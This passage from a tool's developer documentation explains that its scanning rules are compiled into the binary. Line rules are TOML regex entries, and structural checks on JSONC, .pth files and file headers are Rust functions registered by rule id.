**How rules are built.** Rules are built into the binary, so adding one means
a rebuild. Line rules are plain TOML (`engine = "line-regex"`), so a pattern
can be added without touching the engine. Most structural checks (JSONC,
`.pth` files, file headers) are Rust functions with one signature,
`fn(&Ctx) -> Vec<Hit>`, registered by rule id; their TOML entry carries the
metadata and the file globs. How to add one is in
[CONTRIBUTING.md](../CONTRIBUTING.md#adding-a-rule).
